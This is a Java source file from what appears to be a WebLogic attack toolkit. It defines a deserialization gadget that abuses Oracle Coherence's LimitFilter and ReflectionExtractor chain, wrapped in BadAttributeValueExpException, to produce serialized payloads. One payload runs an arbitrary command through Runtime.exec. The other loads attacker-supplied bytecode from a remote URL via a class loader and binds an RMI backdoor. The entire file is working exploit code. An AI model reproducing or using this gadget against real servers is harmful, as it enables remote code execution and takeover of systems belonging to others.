package com.r4v3zn.weblogic.tools.gadget.impl;

import com.r4v3zn.weblogic.tools.annotation.Authors;
import com.r4v3zn.weblogic.tools.annotation.Dependencies;
import com.r4v3zn.weblogic.tools.gadget.ObjectPayload;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * Title: LimitFilterGadget
 * Desc: TODO
 * Date:2020/3/29 1:31
 * Email:woo0nise@gmail.com
 * Company:www.r4v3zn.com
 * @author R4v3zn
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN})
@Dependencies({":weblogic:coherence", ":mozilla:javascript"})
public class LimitFilterGadget implements ObjectPayload<Serializable> {
    /**
     * 获取序列化 payload (Runtime)
     * @param command 执行的命令
     * @return 序列结果
     * @throws Exception
     */
    @Override
    public Serializable getObject(String command, URLClassLoader urlClassLoader) throws Exception {
        final String[] execArgs = new String[] { command };
        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                new ReflectionExtractor("getMethod", new Object[]{
                        "getRuntime", new Class[0]
                }),
                new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                new ReflectionExtractor("exec", new Object[]{execArgs})
        };
        return getObject(valueExtractors, Runtime.class);
    }

    /**
     * 获取序列化 payload
     * @param codeByte 需要序列化的字节码
     * @param bootArgs 执行中参数,0位传入执行class命令,1位传入DefiningClassLoader url
     * @param className 反射的 class name
     * @return 序列结果
     * @throws Exception
     */
    @Override
    public Serializable getObject(byte[] codeByte, String[] bootArgs, String className) throws Exception {
        String classPath = bootArgs[1];
        URL url = new URL(classPath);
        URL[] urls = new URL[]{url};
        final ValueExtractor[] valueExtractors = new ValueExtractor[]{
                new ReflectionExtractor("getConstructor", new Object[]{new Class[]{URL[].class}}),
                new ReflectionExtractor("newInstance",new Object[]{new Object[]{urls}}),
                new ReflectionExtractor("loadClass", new Object[]{"org.mozilla.classfile.DefiningClassLoader"}),
                new ReflectionExtractor("newInstance"),
                new ReflectionExtractor("defineClass", new Object[]{className, codeByte}),
                new ReflectionExtractor("newInstance"),
                new ReflectionExtractor("rmiBind",  new Object[]{bootArgs[0]})};
        return getObject(valueExtractors, URLClassLoader.class);
    }

    /**
     * 获取序列化 payload
     * @param valueExtractors ValueExtractors
     * @param clazz 反序列化的 class
     * @return 序列结果
     * @throws Exception
     */
    private Serializable getObject(final ValueExtractor[] valueExtractors, Class clazz) throws Exception {
        // chain
        LimitFilter limitFilter = new LimitFilter();
        BadAttributeValueExpException expException = new BadAttributeValueExpException(null);
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, new ChainedExtractor(valueExtractors));
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, clazz.getClass());
        Field val = expException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(expException, limitFilter);
        return expException;
    }
}
